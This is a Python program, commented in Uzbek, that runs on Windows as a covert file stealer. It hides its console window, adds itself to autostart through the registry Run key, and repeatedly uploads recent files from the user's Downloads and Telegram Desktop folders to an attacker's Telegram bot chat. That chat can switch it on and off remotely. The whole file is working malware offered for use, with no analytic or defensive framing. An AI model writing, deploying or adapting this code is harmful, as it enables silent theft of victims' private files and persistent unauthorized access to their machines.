import os
import glob
import logging
import time
import json
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# --- KONFIGURATSIYA (TOKEN va CHAT_ID ni shu yerga yozing) ---
TOKEN = "SIZNING_BOT_TOKENINGIZ"
CHAT_ID = "SIZNING_CHAT_IDINGIZ"

# --- SKRYASTI KONSOL (Agar .exe qilingan bo'lsa, oynani yashirish) ---
if getattr(sys, 'frozen', False):
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# --- REGISTRY ORQALI AUTOSTARTGA QO'SHISH ---
def add_to_startup():
    """Dasturni Windows reyestriga avtostartga qo'shish."""
    try:
        import winreg as reg
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
            
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "TelegramAutoUploader"
        
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, key_name, 0, reg.REG_SZ, f'"{exe_path}"')
        logging.info("Dastur avtostartga muvaffaqiyatli qo'shildi.")
    except Exception as e:
        logging.error(f"Avtostartga qo'shishda xatolik: {e}")

# Logging sozlamalari
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
    handlers=[logging.StreamHandler()]
)

# Yo'llar
DOWNLOADS_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
TG_DESKTOP_DIR = os.path.join(DOWNLOADS_DIR, "Telegram Desktop")
STATE_FILE = "sent_files.json"

# Sozlanadigan parametrlar
MAX_FILE_SIZE_MB = 50
LIMIT = 10
MAX_WORKERS = 3
EXCLUDED_EXTENSIONS = {".tmp", ".crdownload", ".part", ".exe", ".bat"}

# Global holat (Bot ishlayaptimi yoki to'xtatilganmi)
bot_running = True
bot_lock = threading.Lock()

def load_sent_files():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                return set(json.load(f))
        except Exception as e:
            logging.error(f"State faylini o'qishda xatolik: {e}")
    return set()

def save_sent_file(file_path):
    sent_files = load_sent_files()
    sent_files.add(file_path)
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(list(sent_files), f, ensure_ascii=False, indent=4)
    except Exception as e:
        logging.error(f"State fayliga yozishda xatolik: {e}")

def send_telegram_message(text):
    """Chatga matnli xabar yuborish funksiyasi."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        logging.error(f"Xabar yuborishda xatolik: {e}")

def check_telegram_commands():
    """Telegramdan keladigan /start va /stop buyruqlarini doimiy tekshirib turish."""
    global bot_running
    offset = 0
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        try:
            response = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35)
            if response.status_code == 200:
                data = response.json()
                for result in data.get("result", []):
                    offset = result["update_id"] + 1
                    message = result.get("message", {})
                    chat = message.get("chat", {})
                    
                    # Faqat o'zimizning CHAT_ID dan kelgan buyruqlarni qabul qilamiz
                    if str(chat.get("id")) == str(CHAT_ID):
                        text = message.get("text", "").strip().lower()
                        
                        if text == "/start":
                            with bot_lock:
                                bot_running = True
                            logging.info("Bot /start buyrug'i bilan YOQILDI.")
                            send_telegram_message("🟢 <b>Bot ishga tushdi!</b> Fayllarni yuborish davom etadi.")
                            
                        elif text == "/stop":
                            with bot_lock:
                                bot_running = False
                            logging.info("Bot /stop buyrug'i bilan TO'XTatildi.")
                            send_telegram_message("🔴 <b>Bot to'xtatildi!</b> Yangi fayllar yuborilmaydi (qayta yoqish uchun /start bosing).")
        except Exception as e:
            logging.error(f"Buyruqlarni tekshirishda tarmoq xatoligi: {e}")
            time.sleep(5)
        time.sleep(1)

def send_file_to_tg(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    filename = os.path.basename(file_path)
    
    if TG_DESKTOP_DIR in file_path:
        source_folder = "Telegram Desktop"
    else:
        source_folder = "Downloads"
        
    full_path = os.path.abspath(file_path)
    caption = f"📂 <b>Manba:</b> {source_folder}\n📄 <b>Fayl:</b> {filename}\n📍 <b>Manzil:</b>\n<code>{full_path}</code>"
    
    try:
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > MAX_FILE_SIZE_MB:
            return False
    except Exception:
        return False

    payload = {
        "chat_id": CHAT_ID,
        "caption": caption,
        "parse_mode": "HTML"
    }
    
    for attempt in range(3):
        try:
            with open(file_path, "rb") as file:
                files = {"document": (filename, file)}
                response = requests.post(url, data=payload, files=files, timeout=60)
                
                if response.status_code == 200:
                    logging.info(f"Muvaffaqiyatli! {filename} yuborildi.")
                    save_sent_file(file_path)
                    return True
                elif response.status_code == 429:
                    time.sleep(5 * (attempt + 1))
                else:
                    break
        except Exception:
            time.sleep(3)
            
    return False

def collect_files():
    sent_files = load_sent_files()
    all_files = []
    
    search_paths = [
        os.path.join(DOWNLOADS_DIR, "*.*"),
        os.path.join(TG_DESKTOP_DIR, "*.*")
    ]
    
    for path_pattern in search_paths:
        if os.path.exists(os.path.dirname(path_pattern)):
            for f in glob.glob(path_pattern):
                if os.path.isfile(f):
                    if f in sent_files:
                        continue
                    if os.path.splitext(f)[1].lower() in EXCLUDED_EXTENSIONS:
                        continue
                    all_files.append(f)

    if not all_files:
        return []

    all_files.sort(key=os.path.getmtime, reverse=True)
    return all_files[:LIMIT]

def main():
    add_to_startup()
    
    # Telegram buyruqlarini eshitish uchun alohida oqim (background thread) ochamiz
    listener_thread = threading.Thread(target=check_telegram_commands, daemon=True)
    listener_thread.start()
    
    logging.info("Dastur va buyruqlar tinglovchisi ishga tushdi...")
    send_telegram_message("🤖 <b>Uploader bot ishga tushdi!</b>\nBuyruqlar:\n/start - Botni yoqish\n/stop - Botni to'xtatish")
    
    while True:
        try:
            # Bot holatini tekshirish (/stop bosilgan bo'lsa ishlamay turadi)
            with bot_lock:
                is_active = bot_running
                
            if is_active:
                target_files = collect_files()
                if target_files:
                    logging.info(f"Yangi yuboriladigan fayllar soni: {len(target_files)}")
                    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                        futures = {executor.submit(send_file_to_tg, f): f for f in target_files}
                        for future in as_completed(futures):
                            try:
                                future.result()
                            except Exception as e:
                                logging.error(f"Xatolik: {e}")
                else:
                    logging.info("Yangi fayllar topilmadi. Kutilmoqda...")
            else:
                logging.info("Bot to'xtatilgan holatda (/stop). Fayllar tekshirilmachoq...")
        except Exception as e:
            logging.error(f"Asosiy siklda xatolik: {e}")
            
        time.sleep(60)

if __name__ == "__main__":
    main()